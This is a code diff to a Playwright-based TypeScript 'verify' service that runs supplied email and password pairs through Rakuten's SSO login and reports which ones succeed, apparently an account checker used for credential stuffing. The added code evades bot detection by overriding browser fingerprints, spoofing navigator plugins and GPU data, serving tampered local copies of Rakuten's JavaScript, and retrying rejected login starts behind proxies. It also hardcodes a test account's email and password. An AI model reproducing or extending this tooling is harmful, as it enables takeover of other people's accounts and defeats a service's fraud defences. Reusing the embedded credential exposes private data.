@@ -3,10 +3,14 @@ import IVerifyService from "../../application/ports/IVerifyService";
 import { Credential } from "../../core/entities/Credential";
 import UserAgent from "user-agents"
 import { sleep, IPhoneDevice, createGPUSpoofScript } from "../../utils";
-import { Page, devices } from "patchright";
+import { Page, devices, Route } from "patchright";
 import IProxyRepository from "../../core/repositories/IProxyRepository";
+import * as fs from "fs";
+import * as path from "path";
+import { createRatOverrideScript, CustomRat } from "../../utils/ratOverride";
 
 const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?r10_required_claims=r10_name&r10_audience=rae&r10_guest_login=true&r10_jid_service_id=rm001&scope=openid+memberinfo_read_safebulk+memberinfo_read_point+memberinfo_get_card_token+1Hour%40Access+90days%40Refresh&response_type=code&redirect_uri=https%3A%2F%2Fportal.mobile.rakuten.co.jp%2Fauth%2Fcallback&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin&client_id=rmn_app_web#/sign_in';
+
 const TEST_ACCOUNT = {
   email: 's13301700128@gmail.com',
   password: 'hika3ta5900'
@@ -16,7 +20,24 @@ export default class PlaywrightVerify implements IVerifyService {
   // Default device type - change this to switch between devices
   private deviceType: IPhoneDevice = 'iphone-13';
 
-  constructor(private readonly proxyRepository: IProxyRepository) {}
+  // Custom RAT for fingerprint override (injected from wire layer)
+  private customRat: CustomRat | null;
+
+  // Map URL patterns to local file names
+  private readonly localJsMap = new Map<string, string>([
+    ['/widget/js/zxcvbn.js', 'zxcvbn.js'],
+    ['/widget/js/UzBsVExITjBkWEJwWkNF-2.27.2.min.js', 'UzBsVExITjBkWEJwWkNF-2.27.2.min.js'],
+  ]);
+
+  constructor(
+    private readonly proxyRepository: IProxyRepository,
+    customRat: CustomRat | null
+  ) {
+    this.customRat = customRat;
+    if (customRat) {
+      console.log('[PlaywrightVerify] Custom RAT injected:', customRat.hash);
+    }
+  }
 
   /**
    * Set the iPhone device type for GPU spoofing
@@ -26,6 +47,67 @@ export default class PlaywrightVerify implements IVerifyService {
    */
   private setDeviceType(device: IPhoneDevice): void {
     this.deviceType = device;
+  }
+
+  /**
+   * Set a custom RAT (fingerprint) to override the browser fingerprint
+   * Call this before verify() to use your own fingerprint
+   */
+  public setCustomRat(customRat: CustomRat): void {
+    this.customRat = customRat;
+    console.log('[RatOverride] Custom RAT set:', customRat.hash);
+  }
+
+  /**
+   * Clear custom RAT and use real browser fingerprint
+   */
+  public clearCustomRat(): void {
+    this.customRat = null;
+    console.log('[RatOverride] Custom RAT cleared');
+  }
+
+  /**
+   * Get the assets directory path (works in both dev and bundled environments)
+   */
+  private getAssetsPath(): string {
+    return path.join(process.cwd(), 'assets', 'js');
+  }
+
+  /**
+   * Handle local JS file serving by intercepting specific requests
+   */
+  private async handleLocalJs(route: Route): Promise<void> {
+    const request = route.request();
+    const url = request.url();
+
+    // Check if URL matches any pattern in localJsMap
+    for (const [pattern, localFileName] of this.localJsMap) {
+      if (url.includes(pattern)) {
+        try {
+          const assetsPath = this.getAssetsPath();
+          const localFilePath = path.join(assetsPath, localFileName);
+
+          if (fs.existsSync(localFilePath)) {
+            const content = fs.readFileSync(localFilePath, 'utf-8');
+            await route.fulfill({
+              status: 200,
+              contentType: 'application/javascript',
+              body: content,
+            });
+            console.log(`[Local JS] Served ${pattern} from local: ${localFilePath}`);
+            return;
+          } else {
+            console.warn(`[Local JS] File not found: ${localFilePath}, falling back to remote`);
+          }
+        } catch (err) {
+          console.error(`[Local JS] Failed to load ${localFileName}:`, err);
+          // Fall through to original request
+        }
+      }
+    }
+
+    // Continue to original request if no match or error
+    await route.continue();
   }
 
   async verify(credential: Credential): Promise<boolean> {
@@ -72,8 +154,28 @@ export default class PlaywrightVerify implements IVerifyService {
 
     const page = await context.newPage();
 
+    // Inject navigator plugins spoofing
+    await page.addInitScript(() => {
+      Object.defineProperty(navigator, 'plugins', {
+        get: () => [],
+      });
+      Object.defineProperty(navigator, 'mimeTypes', {
+        get: () => [],
+      });
+    });
+
+    // Inject RatOverride if custom RAT is set
+    if (this.customRat) {
+      const ratOverrideScript = createRatOverrideScript(this.customRat);
+      await page.addInitScript(ratOverrideScript);
+      console.log('[RatOverride] Script injected with custom RAT:', this.customRat.hash);
+    }
+
+    // Enable local JS file routing for specific files
+    await page.route('**/*.js', (route) => this.handleLocalJs(route));
+
     // Apply GPU spoofing based on device type
-    // await this.applyGPUSpoofing(page);
+    await this.applyGPUSpoofing(page);
 
     const client = await context.newCDPSession(page);
 
@@ -108,18 +210,46 @@ export default class PlaywrightVerify implements IVerifyService {
     // }
 
     try {
+      // Retry flow for /v2/login/start 400 errors
+      let maxRetries = 3;
+      let loginStartSuccess = false;
+
       await page.goto(LOGIN_URL);
       await page.waitForLoadState('networkidle');
 
-      await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
-      const nextButton1 = await page.locator('[class*="button__submit"]').first();
-      await nextButton1.waitFor({ state: 'visible', timeout: 5000 });
-      await nextButton1.click();
-      await page.waitForLoadState('networkidle');
+      for (let attempt = 0; attempt < maxRetries; attempt++) {
+        await page.locator('#user_id').fill(isDebug ? TEST_ACCOUNT.email : credential.email);
+        const nextButton1 = await page.locator('[class*="button__submit"]').first();
+        await nextButton1.waitFor({ state: 'visible', timeout: 5000 });
 
-    if (isDebug) {
-      await sleep(1000000000)
-    }
+        // Watch for /v2/login/start response
+        const loginStartPromise = page.waitForResponse(response =>
+          response.url().includes('/v2/login/start')
+        );
+
+        await nextButton1.click();
+        await page.waitForLoadState('networkidle');
+
+        const loginStartResponse = await loginStartPromise;
+        if (loginStartResponse.status() === 400) {
+          console.log(`[Login Start] Got 400, retrying... (Attempt ${attempt + 1}/${maxRetries})`);
+          await page.reload();
+          await page.waitForLoadState('networkidle');
+          continue;
+        }
+
+        loginStartSuccess = true;
+        break;
+      }
+
+      if (!loginStartSuccess) {
+        console.log('[Login Start] Max retries reached, giving up');
+        return false;
+      }
+
+      if (isDebug) {
+        await sleep(1000000000)
+      }
 
       await page.waitForURL('**/sign_in/password');
       await page.locator('#password_current').fill(isDebug ? TEST_ACCOUNT.password : credential.password);
